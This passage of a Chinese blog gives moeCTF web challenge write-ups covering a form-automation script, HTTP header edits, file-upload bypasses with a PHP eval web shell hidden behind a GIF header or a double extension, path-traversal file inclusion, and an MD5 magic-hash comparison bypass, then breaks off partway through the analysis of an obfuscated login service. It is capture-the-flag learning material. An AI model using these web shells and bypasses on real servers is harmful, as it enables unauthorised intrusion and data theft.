</span><br><span class="line">moectf&#123;w3lCome_To_moeCTF_W2b_challengE!!&#125;  </span><br></pre></td></tr></table></figure></div>

<h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p><img src="https://pic1.imgdb.cn/item/67bc86ccd0e0a243d403b5b3.png"><br>这里就像一个小游戏,但是在这么短的时间内做完这个反应还是有点难，写一个python脚本吧<br>首先先看这个页面的源代码，在这里可以找到参数传递的方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--maybe id can help you locate the information--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;info&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">h2</span>&gt;</span>比赛开始！<span class="tag">&lt;/<span class="name">h2</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span>弯道向左，抓地力太小了！<span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;driver&quot;</span>&gt;</span>选手:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;steering_control&quot;</span>&gt;</span>方向控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">name</span>=<span class="string">&quot;steering_control&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;-1&quot;</span>&gt;</span>左<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> <span class="attr">selected</span>&gt;</span>直行<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>右<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;throttle&quot;</span>&gt;</span>油门控制:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">name</span>=<span class="string">&quot;throttle&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span>&gt;</span>松开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>&gt;</span>保持<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;2&quot;</span> <span class="attr">selected</span>&gt;</span>全开<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>然后这里我们知道提交的方式是POST，然后找到每一个数据的ID，这里有<code>driver</code> <code>steering_control</code> <code>throttle</code><br>这里就根据每次传递数据之后返回的结果来决定下一次的数</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="attr">url</span> <span class="operator">=</span> &#x27;http:<span class="operator">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">62839</span><span class="operator">/</span>&#x27;</span><br><span class="line">s<span class="attr">ession</span> <span class="operator">=</span> requests.session()</span><br><span class="line"></span><br><span class="line"><span class="attr">response</span> <span class="operator">=</span> session.post(url,data<span class="operator">=</span>&#123;<span class="string">&quot;driver&quot;</span>:<span class="string">&quot;kakeru&quot;</span>,<span class="string">&quot;steering_control&quot;</span>:<span class="number">0</span>,<span class="string">&quot;throttle&quot;</span>:<span class="number">0</span>&#125;) <span class="comment">#先发送一次请求，根据结果操作</span></span><br><span class="line"></span><br><span class="line">for i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    <span class="attr">text</span> <span class="operator">=</span> response.text</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 方向控制，和返回的方向相反</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;向左&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    elif <span class="string">&quot;向右&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="operator">-</span><span class="number">1</span></span><br><span class="line">    <span class="params">else :</span></span><br><span class="line">        <span class="attr">data_1</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 抓地力判断，油门越大，抓地力越小</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;太小&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    elif <span class="string">&quot;太大&quot;</span> <span class="keyword">in</span> <span class="params">text:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    <span class="params">else:</span></span><br><span class="line">        <span class="attr">data_2</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="attr">Data</span> <span class="operator">=</span> &#123;</span><br><span class="line">        <span class="string">&quot;driver&quot;</span> : <span class="string">&quot;kakeru&quot;</span>,</span><br><span class="line">        <span class="string">&quot;steering_control&quot;</span> : data_1,</span><br><span class="line">        <span class="string">&quot;throttle&quot;</span> : data_2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attr">response</span> <span class="operator">=</span> session.post(url,data <span class="operator">=</span> Data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;moectf&#123;&quot;</span> <span class="keyword">in</span> response.<span class="params">text :</span></span><br><span class="line">        print(response.text)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67bc8dbed0e0a243d403b736.png"></p>
<h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p><img src="https://pic1.imgdb.cn/item/67bc8df2d0e0a243d403b73e.png"><br>这题就是要求我们对http头修改<br><img src="https://pic1.imgdb.cn/item/67bc8ff0d0e0a243d403b775.png"></p>
<h1 id="meo-图床"><a href="#meo-图床" class="headerlink" title="meo 图床"></a>meo 图床</h1><p>一道文件上传题目<br>上传一个一句话木马的php文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p>提示： 只允许上传图片文件（JPEG、PNG 或 GIF）。<br>先考虑是不是只是在前端做校验，改成jpg文件，然后bp发包改成php后缀<br>上传之后还是不行<br><img src="https://pic1.imgdb.cn/item/67bc943dd0e0a243d403bbc7.png"><br>但是再添加一个GIF头就可以了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>
<p><img src="https://pic1.imgdb.cn/item/67bc947cd0e0a243d403bc25.png"><br>这里先尝试用蚁剑连接，但是失败了<br><img src="https://pic1.imgdb.cn/item/67bc9523d0e0a243d403bd22.png"><br>文件已经成功上传，但是无法连接 –&gt; 所以就要转换思路<br>看到这里访问文件的方式很特别，直接用get请求访问这个图片的位置，那就有可能存在本地文件包含漏洞<br>验证一下，发现确实可以<br><img src="https://pic1.imgdb.cn/item/67bc9621d0e0a243d403be27.png"><br>然后访问<code>../../../../../flag</code> </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">hello~</span><br><span class="line">Flag Not Here~</span><br><span class="line">Find Somewhere Else~</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--Fl3g_n0t_Here_dont_peek!!!!!.php--&gt;</span></span><br><span class="line"></span><br><span class="line">Not Here~~~~~~~~~~~~~ awa</span><br></pre></td></tr></table></figure></div>
<p>再去这新的flag地址<br>得到一个源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> O.o?</span><br></pre></td></tr></table></figure></div>
<p>就是输入两个不一样的值然后它们的md5值一样，这很经典了<br><code>http://127.0.0.1:55659/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=240610708&amp;param2=QNKCDZO</code><br>得到flag</p>
<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>还是一个文件上传。这题是提示只允许后缀是png的文件，还是先用bp改一下后缀试试,改完显示后缀名不符合要求<br>目录扫一下，发现有个upload.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$targetDir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$allowedExtensions</span> = [<span class="string">&#x27;png&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmp_path</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>] !== <span class="string">&#x27;image/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件类型不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">filesize</span>(<span class="variable">$tmp_path</span>) &gt; <span class="number">512</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件太大&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uploadFilePath</span> = <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$targetDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_path</span>, <span class="variable">$uploadFilePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>, <span class="string">&#x27;file_path&#x27;</span> =&gt; <span class="variable">$uploadFilePath</span>]));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件上传失败&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>这里判断的逻辑是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$fileName</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$fileNameParts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$fileName</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$fileNameParts</span>) &gt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="variable">$secondSegment</span> = <span class="variable">$fileNameParts</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$secondSegment</span> !== <span class="string">&#x27;png&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;文件后缀不符合要求&#x27;</span>]));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>
<p>用’.’分隔，然后看第一个.后面是不是png，那就可以在后面在加php比如2.png.php<br>先是在浏览器直接上传，还是提示后缀问题，用bp改包发送就没问题了<br><img src="https://pic1.imgdb.cn/item/67bc9e46d0e0a243d403c4ea.png"><br>蚁剑连接，在根目录得到flag<br><img src="https://pic1.imgdb.cn/item/67bc9e8cd0e0a243d403c4f4.png"></p>
<h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p><img src="https://pic1.imgdb.cn/item/67be7785d0e0a243d405d388.png"><br>下载题目源码<br>关键部分</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">int</span>.to_bytes(<span class="number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span>^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>,<span class="string">&quot;big&quot;</span>,signed=<span class="literal">True</span>).decode().translate(&#123;<span class="built_in">ord</span>(c):<span class="literal">None</span> <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&quot;\x00&quot;</span>&#125;)) <span class="comment"># what is it?</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data:<span class="built_in">str</span></span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">            data = base64.b64encode(data).decode() <span class="comment"># ummm...? It looks like it&#x27;s just base64 encoding it 5 times? truely?</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_POST</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.path == <span class="string">&quot;/login&quot;</span>:</span><br><span class="line">                body = <span class="variable language_">self</span>.rfile.read(<span class="built_in">int</span>(<span class="variable language_">self</span>.headers.get(<span class="string">&quot;Content-Length&quot;</span>)))</span><br><span class="line">                payload = json.loads(body)</span><br><span class="line">                params = json.loads(decrypt(payload[<span class="string">&quot;params&quot;</span>]))</span><br><span class="line">                <span class="built_in">print</span>(params)</span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN AS ADMIN!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">if</span> params.get(<span class="string">&quot;username&quot;</span>) == params.get(<span class="string">&quot;password&quot;</span>):</span><br><span class="line">                    <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                    <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                    <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;same&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                hashed = gethash(params.get(<span class="string">&quot;username&quot;</span>),params.get(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users.items():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable language_">self</span>.send_response(<span class="number">200</span>)</span><br><span class="line">                        <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                        <span class="variable language_">self</span>.wfile.write(json.dumps(data).encode())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">403</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;Invalid username or password&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="variable language_">self</span>.send_response(<span class="number">404</span>)</span><br><span class="line">                <span class="variable language_">self</span>.end_headers()</span><br><span class="line">                <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;404 Not Found&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="variable language_">self</span>.send_response(<span class="number">500</span>)</span><br><span class="line">            <span class="variable language_">self</span>.end_headers()</span><br><span class="line">            <span class="variable language_">self</span>.wfile.write(<span class="string">b&quot;500 Internal Server Error&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>这里通过post请求传递参数，而且需要用户名和密码一样，但是是一个弱比较，如果完全相等也不行</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">print</span> (int.<span class="built_in">to_bytes</span>( <span class="number">0</span>x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164 ^<span class="number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span>,<span class="number">160</span>, <span class="string">&quot;big&quot;</span>, signed=True).<span class="built_in">decode</span>().<span class="built_in">translate</span>(&#123;<span class="built_in">ord</span>(c): None for c in <span class="string">&quot;\x00&quot;</span>&#125;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 输出</span><br><span class="line"><span class="selector-attr">[[0]</span> <span class="selector-tag">for</span> <span class="selector-tag">base64</span><span class="selector-class">.b64encode</span> <span class="selector-tag">in</span> <span class="selector-attr">[base64.b64decode]</span>]</span><br></pre></td></tr></table></figure></div>
<p>前面eval语句执行的内容就是把base64 encode 变成decode ， decrepit函数就是把数据base64加密5次（但是前面因为encode变成decode了所以就是base64解码5次</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gethash</span>(<span class="params">*items</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> items:</span><br><span class="line">        <span class="keyword">if</span> item <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        c ^= <span class="built_in">int</span>.from_bytes(hashlib.md5(<span class="string">f&quot;<span class="subst">&#123;salt&#125;</span>[<span class="subst">&#123;item&#125;</span>]<span class="subst">&#123;salt&#125;</span>&quot;</span>.encode()).digest(), <span class="string">&quot;big&quot;</span>) <span class="comment"># it looks so complex! but is it safe enough?</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(c)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure></div>
<p>这个函数它会遍历每个参数，使用 MD5 哈希算法对每个参数进行哈希处理，然后将这些哈希值进行异或运算，最终返回异或结果的十六进制表示。然后最后去掉前两位就是0x<br>得到flag的部分</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">hashed_users = <span class="built_in">dict</span>((k,<span class="built_in">gethash</span>(k,v)) <span class="keyword">for</span> k,v <span class="keyword">in</span> users<span class="selector-class">.items</span>())</span><br><span class="line">hashed = <span class="built_in">gethash</span>(params<span class="selector-class">.get</span>(<span class="string">&quot;username&quot;</span>),params<span class="selector-class">.get</span>(<span class="string">&quot;password&quot;</span>))</span><br><span class="line">                <span class="keyword">for</span> k,v <span class="keyword">in</span> hashed_users<span class="selector-class">.items</span>():</span><br><span class="line">                    <span class="keyword">if</span> hashed == v:</span><br><span class="line">                        data = &#123;</span><br><span class="line">                            <span class="string">&quot;user&quot;</span>:k,</span><br><span class="line">                            <span class="string">&quot;hash&quot;</span>:hashed,</span><br><span class="line">                            <span class="string">&quot;flag&quot;</span>: FLAG <span class="keyword">if</span> k == <span class="string">&quot;admin&quot;</span> <span class="keyword">else</span> <span class="string">&quot;flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                        self<span class="selector-class">.send_response</span>(<span class="number">200</span>)</span><br><span class="line">                        self<span class="selector-class">.end_headers</span>()</span><br><span class="line">                        self<span class="selector-class">.wfile</span><span class="selector-class">.write</span>(json<span class="selector-class">.dumps</span>(data)<span class="selector-class">.encode</span>())</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">                        return</span><br></pre></td></tr></table></figure></div>
